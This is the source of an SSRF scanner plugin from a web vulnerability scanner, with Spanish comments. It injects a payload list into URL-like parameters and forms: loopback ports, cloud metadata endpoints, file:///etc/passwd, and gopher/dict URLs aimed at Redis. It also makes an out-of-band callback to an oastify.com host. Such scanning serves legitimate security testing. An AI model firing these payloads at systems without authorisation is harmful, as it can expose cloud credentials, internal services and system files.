"""
plugins/dast/ssrf_scanner.py — Plugin de Server-Side Request Forgery (SSRF)

Detecta SSRF probando parámetros que controlan URLs de fetch/descarga
con payloads que apuntan a servicios internos y un callback OOB.

Categoría OWASP: A10:2021 — Server-Side Request Forgery
CWE: CWE-918 (Server-Side Request Forgery)
"""

import time
from urllib.parse import urljoin, urlparse, parse_qs
from core.interfaces import BasePlugin
from core.logger import get_logger
from core.modelos import CategoriaOWASP, Confianza, Hallazgo, Severidad

logger = get_logger("ssrf_scanner")

_PARAMS_SSRF = {"url", "file", "load", "read", "path", "src", "href", "dest",
                "redirect", "uri", "resource", "data", "page", "document",
                "template", "include", "img", "image", "avatar", "profile",
                "fetch", "request", "endpoint", "webhook", "callback", "target",
                "domain", "host", "server", "addr", "location", "return"}

_PAYLOADS_INTERNOS = [
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:3000",
    "http://127.0.0.1:5000",
    "http://127.0.0.1:9200",  # Elasticsearch
    "http://127.0.0.1:6379",  # Redis
    "http://127.0.0.1:3306",  # MySQL
    "http://127.0.0.1:5432",  # PostgreSQL
    "http://127.0.0.1:27017",  # MongoDB
    "http://localhost:80",
    "http://localhost:8080",
    "http://localhost:3000",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
    "http://metadata.tencentyun.com/latest/meta-data/",  # Tencent
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_",
    "dict://127.0.0.1:6379/info",
]


class SSRFScannerPlugin(BasePlugin):

    @property
    def nombre(self) -> str:
        return "SSRF Scanner"

    @property
    def categoria_owasp(self) -> CategoriaOWASP:
        return CategoriaOWASP.A10_SSRF

    @property
    def severidad_maxima(self) -> Severidad:
        return Severidad.CRITICA

    def ejecutar(self, target_url: str, http_client, metadata: dict) -> list[Hallazgo]:
        hallazgos = []

        callback_host = f"sesamo-ssrf-{int(time.time())}.oastify.com"

        urls = metadata.get("urls_descubiertas", [])
        formularios = metadata.get("formularios", [])
        endpoints = metadata.get("endpoints_api", [])

        todas_urls = set(urls) | set(endpoints)

        for url in todas_urls:
            hallazgos.extend(self._probar_url(url, _PAYLOADS_INTERNOS, callback_host, http_client))

        for formulario in formularios:
            hallazgos.extend(self._probar_formulario(formulario, _PAYLOADS_INTERNOS, callback_host, http_client, target_url))

        return hallazgos

    def _probar_url(self, url: str, payloads: list[str], callback_host: str, http_client) -> list[Hallazgo]:
        hallazgos = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return hallazgos
        url_base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for param_name in params:
            if param_name.lower() not in _PARAMS_SSRF:
                continue

            for payload in payloads:
                p = {k: v[0] for k, v in params.items()}
                p[param_name] = payload
                response = http_client.get(url_base, params=p)
                if response is None:
                    continue

                if self._tiene_evidencia_ssrf(response, payload):
                    hallazgos.append(Hallazgo(
                        plugin_nombre=self.nombre,
                        categoria_owasp=self.categoria_owasp,
                        severidad=Severidad.CRITICA,
                        confianza=Confianza.CONFIRMADA,
                        url_afectada=url,
                        parametro=param_name,
                        metodo_http="GET",
                        payload_usado=payload,
                        evidencia=f"SSRF detectado — payload '{payload[:60]}...' produjo respuesta inesperada (HTTP {response.status_code}, {len(response.content)} bytes)",
                        cwe_id="CWE-918",
                        remediacion="No permitir que el servidor haga requests basados en input del usuario. Usar whitelist de URLs permitidas. Validar y sanitizar esquemas y dominios.",
                    ))
                    logger.warning(f"  🔴 SSRF en {url_base} [param: {param_name}] → {payload[:50]}")
                    break

        # Probar OOB con callback
        for param_name in params:
            if param_name.lower() in _PARAMS_SSRF:
                oob_payload = f"http://{callback_host}/test"
                p = {k: v[0] for k, v in params.items()}
                p[param_name] = oob_payload
                http_client.get(url_base, params=p)

        return hallazgos

    def _probar_formulario(self, formulario: dict, payloads: list[str], callback_host: str, http_client, target_url: str) -> list[Hallazgo]:
        hallazgos = []
        action = formulario.get("action", "")
        method = formulario.get("method", "GET").upper()
        inputs = formulario.get("inputs", [])
        url_form = action if action.startswith("http") else urljoin(target_url, action)

        for inp in inputs:
            name = inp.get("name", "").lower()
            if name not in _PARAMS_SSRF and "url" not in name and "file" not in name and "img" not in name:
                continue

            for payload in payloads:
                data = {inp["name"]: payload}
                response = http_client.post(url_form, data=data) if method == "POST" else http_client.get(url_form, params=data)
                if response is None:
                    continue

                if self._tiene_evidencia_ssrf(response, payload):
                    hallazgos.append(Hallazgo(
                        plugin_nombre=self.nombre,
                        categoria_owasp=self.categoria_owasp,
                        severidad=Severidad.CRITICA,
                        confianza=Confianza.CONFIRMADA,
                        url_afectada=url_form,
                        parametro=inp["name"],
                        metodo_http=method,
                        payload_usado=payload,
                        evidencia=f"SSRF detectado en formulario.",
                        cwe_id="CWE-918",
                        remediacion="Validar URLs de entrada contra whitelist.",
                    ))
                    logger.warning(f"  🔴 SSRF en formulario {url_form} [campo: {inp['name']}]")
                    break
        return hallazgos

    def _tiene_evidencia_ssrf(self, response, payload: str) -> bool:
        if response.status_code in (502, 504):
            return True
        if "root:x:0:0" in response.text:
            return True
        if "[extensions]" in response.text and "[fonts]" in response.text:
            return True
        if "meta-data" in response.text and "ami-id" in response.text:
            return True
        if "linux version" in response.text and response.status_code == 200:
            return True
        return False
